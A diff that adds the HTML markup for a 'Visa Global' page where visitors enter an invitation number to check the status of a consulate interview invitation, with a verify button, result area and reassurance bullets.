@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Visa Global — Check Invitation Status</title>
+  <link rel="stylesheet" href="/public/app.css"/>
+</head>
+<body>
+  <div class="page">
+    <main class="shell" role="main">
+      <header class="topbar">
+        <div class="brand">
+          <div class="crest"><svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+  <defs>
+    <linearGradient id="g1" x1="0" y1="0" x2="0" y2="1">
+      <stop offset="0" stop-color="#1437c9"/>
+      <stop offset="1" stop-color="#0b1c6b"/>
+    </linearGradient>
+    <linearGradient id="g2" x1="0" y1="0" x2="1" y2="1">
+      <stop offset="0" stop-color="#f9d976"/>
+      <stop offset="1" stop-color="#caa33a"/>
+    </linearGradient>
+  </defs>
+  <path d="M32 4l22 10v18c0 15-10.6 26.8-22 28C20.6 58.8 10 47 10 32V14L32 4z" fill="url(#g1)"/>
+  <path d="M32 9l17 7.7V32c0 11.7-8.3 21.4-17 22.7C23.3 53.4 15 43.7 15 32V16.7L32 9z" fill="none" stroke="url(#g2)" stroke-width="3"/>
+  <path d="M22 35c5-8 15-8 20 0" fill="none" stroke="url(#g2)" stroke-width="3" stroke-linecap="round"/>
+  <path d="M32 20l4 8-4 6-4-6 4-8z" fill="url(#g2)"/>
+  <circle cx="32" cy="36" r="3" fill="url(#g2)"/>
+</svg></div>
+          <div class="brandText">VISA GLOBAL</div>
+        </div>
+        <a class="nav" href="/check">Check Invitation Status &nbsp;›</a>
+      </header>
+
+      <section class="main">
+        <h1>Check Consulate Interview Invitation Status</h1>
+        <p class="sub">Enter your unique reference number issued by Visa Global to verify your invitation.</p>
+
+        <div class="box">
+          <input id="code" class="input" placeholder="Enter your invitation number" autocomplete="off"/>
+          <div style="height:14px"></div>
+          <button id="btn" class="btn" style="min-width:520px;max-width:100%;">VERIFY</button>
+          <div class="hint">Please enter the number exactly as provided, without spaces.</div>
+
+          <div id="msg" class="hint" style="display:none;"></div>
+
+          <div id="result" class="result" style="display:none;">
+            <div style="display:flex;justify-content:space-between;gap:12px;align-items:center;flex-wrap:wrap;">
+              <div>
+                <div id="title" style="font-weight:800;font-size:16px;">Invitation status</div>
+                <div class="small" id="codeOut"></div>
+              </div>
+              <div id="statusPill" class="pill pending">PENDING</div>
+            </div>
+            <div id="noteText" class="small" style="margin-top:10px;"></div>
+            <div id="files" class="files"></div>
+          </div>
+        </div>
+
+        <div class="list" aria-label="Highlights">
+          <div class="li"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+  <circle cx="12" cy="12" r="9" stroke="#2a4bd7" stroke-width="2"/>
+  <path d="M8.3 12.3l2.4 2.4 5-5" stroke="#2a4bd7" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+</svg><div>Your data is protected.</div></div>
+          <div class="li"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+  <circle cx="12" cy="12" r="9" stroke="#2a4bd7" stroke-width="2"/>
+  <path d="M8.3 12.3l2.4 2.4 5-5" stroke="#2a4bd7" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+</svg><div>Verification is automated.</div></div>
+          <div class="li"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+  <circle cx="12" cy="12" r="9" stroke="#2a4bd7" stroke-width="2"/>
+  <path d="M12 10.7v6" stroke="#2a4bd7" stroke-width="2.2" stroke-linecap="round"/>
+  <path d="M12 7.4h.01" stroke="#2a4bd7" stroke-width="3" stroke-linecap="round"/>
+</svg><div>Information provided by Visa Global.</div></div>
+        </div>
+      </section>
+
+      <footer class="footer">© Visa Global • All rights reserved</footer>
+    </main>
+  </div>
+
+  <script src="/public/client.js"></script>
+</body>
+</html>
